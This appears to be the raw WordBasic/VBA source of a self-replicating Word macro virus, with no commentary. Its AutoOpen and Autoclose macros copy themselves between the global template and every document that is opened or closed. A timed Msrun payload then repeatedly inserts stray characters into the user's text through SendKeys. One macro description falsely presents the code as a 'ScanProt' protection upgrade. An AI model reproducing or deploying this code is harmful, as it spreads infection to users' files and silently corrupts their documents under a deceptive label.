   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "Autoclose"

   Public Sub main()
   Attribute main.VB_Description = "ScanProt macro to upgrade your existing protection macros."
   Attribute main.VB_ProcData.VB_Invoke_Func = "TemplateProject.Autoclose.main"
   Dim a$
   Dim b$
   a$ = WordBasic.[FileName$]()



   b$ = a$ + ":AutoOpen"
   If WordBasic.[MacroFileName$]("AutoOpen") = "" Then
       WordBasic.MsgBox b$, "4AUTOCLOSE " + a$
       WordBasic.MacroCopy "Global:AutoOpen", b$
   Else
       WordBasic.MsgBox b$, "!4AUTOCLOSE " + a$
   Rem MacroCopy b$, "Global:AutoOpen"
       WordBasic.MacroCopy "Global:AutoOpen", b$
   End If


   b$ = a$ + ":Autoclose"
   If WordBasic.[MacroFileName$]("Autoclose") = "" Then
       WordBasic.MsgBox b$, "1AUTOCLOSE " + a$
       WordBasic.MacroCopy "Global:Autoclose", b$
   Else
       WordBasic.MsgBox b$, "!1AUTOCLOSE " + a$
   Rem MacroCopy b$, "Global:Autoclose", ExecuteOnly = 1
       WordBasic.MacroCopy "Global:Autoclose", b$
   End If

   b$ = a$ + ":autoexec"
   If WordBasic.[MacroFileName$]("autoexec") = "" Then
       WordBasic.MsgBox b$, "2AUTOCLOSE " + a$
       WordBasic.MacroCopy "Global:autoexec", b$
   Else
       WordBasic.MsgBox b$, "!2AUTOCLOSE " + a$
   Rem MacroCopy b$, "Global:autoexec", ExecuteOnly = 1
       WordBasic.MacroCopy "Global:autoexec", b$
   End If


   b$ = a$ + ":Msrun"
   If WordBasic.[MacroFileName$]("Msrun") = "" Then
       WordBasic.MsgBox b$, "3AUTOCLOSE " + a$
       WordBasic.MacroCopy "Global:Msrun", b$
   Else
       WordBasic.MsgBox b$, "!3AUTOCLOSE " + a$
   Rem MacroCopy b$, "Global:Msrun", ExecuteOnly = 1
       WordBasic.MacroCopy "Global:Msrun", b$
   End If


   WordBasic.FileSaveAs Name:=a$, Format:=1

   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub main()
   Dim a$
   Dim b$
   Dim ExecuteOnly
   a$ = WordBasic.[FileName$]()



   b$ = a$ + ":AutoOpen"
   If WordBasic.[MacroFileName$]("AutoOpen") = "" Then
       WordBasic.MsgBox b$, "4AUTOCLOSE " + a$
       WordBasic.MacroCopy "Global:AutoOpen", b$
   Else
       WordBasic.MsgBox b$, "!4AUTOCLOSE " + a$
       WordBasic.MacroCopy b$, "Global:AutoOpen"
   End If


   b$ = a$ + ":Autoclose"
   If WordBasic.[MacroFileName$]("Autoclose") = "" Then
       WordBasic.MsgBox b$, "1AUTOCLOSE " + a$
       WordBasic.MacroCopy "Global:Autoclose", b$
   Else
       WordBasic.MsgBox b$, "!1AUTOCLOSE " + a$
       WordBasic.MacroCopy b$, "Global:Autoclose", ExecuteOnly = 1
   End If

   b$ = a$ + ":autoexec"
   If WordBasic.[MacroFileName$]("autoexec") = "" Then
       WordBasic.MsgBox b$, "2AUTOCLOSE " + a$
       WordBasic.MacroCopy "Global:autoexec", b$
   Else
       WordBasic.MsgBox b$, "!2AUTOCLOSE " + a$
       WordBasic.MacroCopy b$, "Global:autoexec", ExecuteOnly = 1
   End If


   b$ = a$ + ":Msrun"
   If WordBasic.[MacroFileName$]("Msrun") = "" Then
       WordBasic.MsgBox b$, "3AUTOCLOSE " + a$
       WordBasic.MacroCopy "Global:Msrun", b$
   Else
       WordBasic.MsgBox b$, "!3AUTOCLOSE " + a$
       WordBasic.MacroCopy b$, "Global:Msrun", ExecuteOnly = 1
   End If


   WordBasic.FileSaveAs Name:=a$, Format:=1

   End Sub

   Attribute VB_Name = "autoexec"

   Public Sub main()
   Attribute main.VB_Description = "Executes when Word for Windows is loaded"
   Attribute main.VB_ProcData.VB_Invoke_Func = "TemplateProject.autoexec.main"
   On Error Resume Next
   If WordBasic.Minute(WordBasic.Now()) < 54 Then
   WordBasic.OnTime Str(WordBasic.Hour(WordBasic.Now())) + ":" + Str(WordBasic.Minute(WordBasic.Now()) + 5), "MSrun"
   End If
   If WordBasic.Minute(WordBasic.Now()) > 52 Then
    WordBasic.OnTime Str(WordBasic.Hour(WordBasic.Now()) + 1) + ":" + "04", "MSrun"
   End If
   End Sub

   Attribute VB_Name = "Msrun"

   Public Sub main()
   If WordBasic.CountWindows() > 0 Then
   WordBasic.WordLeft (2)
   WordBasic.EditFind Find:="M", Direction:=0, Wrap:=0
   If WordBasic.AtEndOfDocument() = 0 Then
       WordBasic.SelectCurWord
       WordBasic.SendKeys WordBasic.[Selection$]() + "s"
   End If
   End If
   If WordBasic.Minute(WordBasic.Now()) < 52 Then
   WordBasic.OnTime Str(WordBasic.Hour(WordBasic.Now())) + ":" + Str(WordBasic.Minute(WordBasic.Now()) + 7), "MSrun"
   End If

   If WordBasic.Minute(WordBasic.Now()) > 52 Then
   WordBasic.OnTime Str(WordBasic.Hour(WordBasic.Now()) + 1) + ":" + "04", "MSrun"
   End If
   End Sub
